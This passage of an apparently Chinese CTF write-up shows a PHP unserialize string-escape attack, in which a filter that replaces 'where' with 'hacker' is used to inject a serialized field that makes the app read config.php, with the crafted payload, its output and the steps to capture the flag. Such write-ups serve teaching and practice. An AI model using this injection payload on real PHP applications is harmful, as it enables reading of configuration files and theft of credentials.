class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br>结果：<br>a:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;phone&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;12345678901&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;email&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;123@321.com&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;s:<span class="hljs-number">198</span>:<span class="hljs-string">&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;photo&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;config.php&quot;</span>;&#125;<span class="hljs-string">&quot;;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:5:&quot;</span>wokao<span class="hljs-string">&quot;;&#125;</span><br><span class="hljs-string">a:4:&#123;s:5:&quot;</span>phone<span class="hljs-string">&quot;;s:11:&quot;</span><span class="hljs-number">12345678901</span><span class="hljs-string">&quot;;s:5:&quot;</span>email<span class="hljs-string">&quot;;s:11:&quot;</span><span class="hljs-number">123</span>@<span class="hljs-number">321</span>.com<span class="hljs-string">&quot;;s:8:&quot;</span>nickname<span class="hljs-string">&quot;;s:198:&quot;</span>hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker<span class="hljs-string">&quot;;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:10:&quot;</span>config.php<span class="hljs-string">&quot;;&#125;&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;photo&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;wokao&quot;</span>;&#125;<br><span class="hljs-keyword">array</span>(<span class="hljs-number">4</span>) &#123;<br>  [<span class="hljs-string">&quot;phone&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">11</span>) <span class="hljs-string">&quot;12345678901&quot;</span><br>  [<span class="hljs-string">&quot;email&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">11</span>) <span class="hljs-string">&quot;123@321.com&quot;</span><br>  [<span class="hljs-string">&quot;nickname&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">198</span>) <span class="hljs-string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span><br>  [<span class="hljs-string">&quot;photo&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">10</span>) <span class="hljs-string">&quot;config.php&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>但是nick那么的长度要小于10,采用数组绕过</p>
+<p>在<code>;</code>后面加上<code>&#125;</code>闭合数组，where也要加一个</p>
+<p>最终</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-string">&#x27;12345678901&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-string">&#x27;123@321.com&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]=<span class="hljs-string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;wokao&#x27;</span>;<br><br><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$profile</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250205181546710.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250205181546710"></p>
+<p>上传后拿到图片( 记得抓包</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250205181638367.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250205181638367"></p>
+<p>解码拿到flag</p>
 
                 
               </div>
